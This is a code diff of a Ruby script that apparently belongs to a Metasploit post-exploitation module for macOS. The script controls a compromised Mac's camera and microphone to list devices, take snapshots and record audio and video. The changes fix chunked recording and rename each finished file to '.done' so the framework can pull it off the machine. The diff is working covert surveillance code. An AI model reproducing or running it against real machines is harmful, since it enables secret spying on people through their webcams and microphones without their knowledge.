@@ -1,7 +1,9 @@
 #
 # @author joev
-# This script pulls a 
-# It will not work without the right prefixes, see lib/msf/core/post/osx/ruby_dl.rb
+# This script handles communicating with OSX's media devices
+# to perform LIST, SNAPSHOT, and RECORD actions.
+# It will not work without the right prefixes, see:
+#  > lib/msf/core/post/osx/ruby_dl.rb
 #
 
 # make sure the fs is set up as expected
@@ -241,15 +243,11 @@ if options[:action].to_s == 'list' # print list and die
   if options[:video_enabled]
     puts "===============\nVideo Devices:\n===============\n"
     print_devices(devices, default_device_for_media(vid_type))
-    puts "\nAvailable video compression presets:\n\n"
-    puts available_presets(vid_type).join("\n")
   end
   puts "\n===============\nAudio Devices:\n===============\n"
   print_devices(audio_devices, default_device_for_media(aud_type))
-  puts "\nAvailable audio compression presets:\n\n"
-  presets = available_presets(aud_type)
-  # don't expose the resolution-based presets
-  puts presets.reject { |c| c =~ /\d+x\d+/ }.join("\n")
+  puts "\n==================\nAvailable presets:\n==================\n"
+  puts available_presets(vid_type).join("\n")
   exit
 end
 
@@ -292,7 +290,7 @@ if not objc_call(session, 'canAddOutput:', output).to_i > 0
   raise 'Failed to add file output to stream'
 end
 
-objc_call(session, 'setPreset:', preset)
+# objc_call(session, 'setSessionPreset:', nsstring(options[:preset]))
 objc_call(session, 'addOutput:', output)
 
 objc_call(session, 'startRunning')
@@ -309,20 +307,31 @@ end
 if options[:action] == 'record' # record in a loop for options[:record_len] seconds
   curr_chunk = 0
   last_roll = Time.now
+  run_loop = objc_call_class('NSRunLoop', 'currentRunLoop')
   # wait until at least one frame has been captured
   while curr_chunk < options[:num_chunks]
     time = objc_call(objc_call_class('NSDate', 'new'), 'autorelease')
+    objc_call(run_loop, 'runUntilDate:', objc_call(time, 'dateByAddingTimeInterval:', 0.1))
 
     if Time.now - last_roll > options[:chunk_len].to_i # roll that movie file
+      # rename to '.done' so metasploit knows to yank it asap
+      File.rename(record_file, record_file+'.done')
+
       base = File.basename(record_file, '.*') # returns it with no extension
-      num = ((base.match(/\\d+$/)||['0'])[0].to_i+1).to_s
+      num = ((base.match(/\d+$/)||['0'])[0].to_i+1).to_s
       ext = File.extname(record_file) || 'o'
-      record_file = File.join(File.dirname(record_file), base+num+'.'+ext)
+      record_file = File.join(File.dirname(record_file), base+num+ext)
 
       # redirect buffer output to new file path
       file_url = objc_call_class('NSURL', 'fileURLWithPath:', nsstring(record_file))
-      objc_call(output, 'stopRecording')
-      objc_call(output, 'startRecordingToOutputFileURL:recordingDelegate:', file_url, objc_call_class('NSObject', 'new'))
+      if curr_chunk < options[:num_chunks]-1
+        # objc_call(output, 'stopRecording')
+        # objc_call(session, 'removeOutput:', output)
+        # objc_call(output, 'release')
+        # output = objc_call_class('AVCaptureMovieFileOutput', 'new')
+        # objc_call(session, 'addOutput:', output)
+        objc_call(output, 'startRecordingToOutputFileURL:recordingDelegate:', file_url, objc_call_class('NSObject', 'new'))
+      end
       # remember we hit a chunk
       last_roll = Time.now
       curr_chunk += 1
